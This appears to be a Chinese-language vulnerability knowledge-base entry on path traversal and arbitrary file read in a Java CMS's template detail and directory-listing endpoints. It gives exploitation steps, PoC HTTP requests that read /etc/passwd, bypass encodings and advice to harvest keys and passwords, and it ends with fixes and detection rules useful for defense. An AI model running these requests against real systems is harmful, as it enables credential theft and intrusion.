---
id: web-generic-file-inclusion-template-detail-relative-path-read
title: 模板详情接口 relativePath 直拼 new File + readFileToString：任意文件读取与目录列举
type: scenario
domain: web
path: web/generic/file-inclusion
technique: template-detail-relative-path-file-read
aliases:
- TemplateController detail
- queryFileContent
- relativePath
- rightList parentRelativePath
- 模板文件读取穿越
- JEECMS X2.10
tags:
- java
- spring
- path-traversal
- arbitrary-file-read
- file-read
- template
- jeecms
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V138
  verified_at: '2026-11-06T05:46:58+08:00'
  notes: 已对照原文及截图14-17核对：TemplateController.detail 接收 relativePath，TplLocalServiceImpl.queryFileContent 用 tplPathMethod 拼接后 new File + FileUtils.readFileToString(UTF8) 回显；实测 relativePath 多级 ../ 读取 /etc/passwd 成功；rightList?parentRelativePath 可列 jdk jre 目录。版本 X2.10 为 demo 显示，已清除 affected_versions。未验证点：未复跑 PoC。
---

## 一句话结论

某 Java CMS 的模板管理接口把 `relativePath` 直接传给 `tplPathMethod()` 后 `new File(path)`，再用 `FileUtils.readFileToString()` 读取并回显；`relativePath` 中的 `../` 可逃出模板根，读取 `/etc/passwd`、应用配置、数据库口令等任意进程可读文件；配套的 `rightList?parentRelativePath=...` 还能列目录，用于定位 JDK 路径等目标。

## 原理

- `TemplateController.detail` 接收 `@RequestParam("relativePath") String relativePath`，调用 `tplService.detail(relativePath, siteId)`。
- `TplLocalServiceImpl.detail` → `queryFileContent(relativePath, siteId)`：`String path = tplPathMethod(relativePath, siteId, separator); File file = new File(path);` 若文件存在则 `FileUtils.readFileToString(file, UTF8)`，内容放入响应。
- `new File(path)` 只做字符串组合，不解析 `..`、不检查结果是否仍在模板根内；文件系统打开时才解析 `..`，因此 `../../../../.../etc/passwd` 可读取模板根之外的文件。
- `rightList` 接收 `parentRelativePath`，同样拼接后列目录，返回文件名/大小/时间；可用于确认路径、定位 JDK/配置目录。
- 接口需要管理员令牌（本文场景中可由 Token 续期拦截器缺陷签发），但读取本身是完整的任意文件读取原语，能直接泄露敏感文件。

## 触发条件

- 目标为该 CMS/同源代码，`/server-admin/template/detail`、`/server-admin/template/rightList` 可达。
- 调用者持有管理员令牌或接口鉴权缺失。
- 目标文件对应用进程可读；`../` 层数按模板根到目标的实际层级调整。
- 响应会回显文件内容/目录列表；若只返回布尔状态则只能盲读。

## 利用步骤

1. 获取管理员令牌（如通过 Token 续期拦截器信任 `User-Id`/`User-Name` 头）。
2. 先请求 `rightList?parentRelativePath=../../../../../../etc` 确认目录列举与层级。
3. 请求 `detail?relativePath=../../../../../../../../../../../../../etc/passwd`，确认回显。
4. 读取应用配置、数据库连接串、JWT 密钥、SSH 私钥、源码等；用 `rightList` 定位 JDK 安装路径（如 `/usr/local/java/jdk1.8.0_261/jre`）。
5. 把读到的凭据/路径用于后续横向或任意文件写入链。

## PoC

```http
GET /server-admin/template/detail?relativePath=../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: target
Token: <admin JWT>
Site-Id: 1
```

```http
GET /server-admin/template/rightList?parentRelativePath=../../../../../../usr/local/java/jdk1.8.0_261/jre HTTP/1.1
Host: target
Token: <admin JWT>
Site-Id: 1
```

## 变体与关联

- 参数名变体：`relativePath`、`parentRelativePath`、`path`、`fileName`。
- 编码/过滤绕过：`%2e%2e%2f`、双重编码、`..%5c`、`....//`、绝对路径。
- 关联：[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]（同一 `new File + readFileToString` 原语）、[[web-generic-file-upload-template-relative-path-original-filename-arbitrary-write]]（同 CMS 的写入侧）、[[web-generic-auth-token-renewal-trusted-user-headers-admin-jwt]]（前置鉴权绕过）。

## 检测与防御

- 修复：读取前 `getCanonicalPath()`/`toRealPath()` 并与模板根前缀比较；拒绝绝对路径、`..`、符号链接；接口只接受文件 ID。
- 加固：Web 进程最小权限；敏感配置/密钥不在 Web 进程可读范围；模板目录与配置目录隔离。
- 检测：`relativePath`/`parentRelativePath` 含 `../`、绝对路径、盘符；响应出现 `/etc/passwd`、`password=`、私钥头；短时间读取多个目录。
- 审计：搜索 `new File(`、`readFileToString`、`rightList`、`relativePath`。
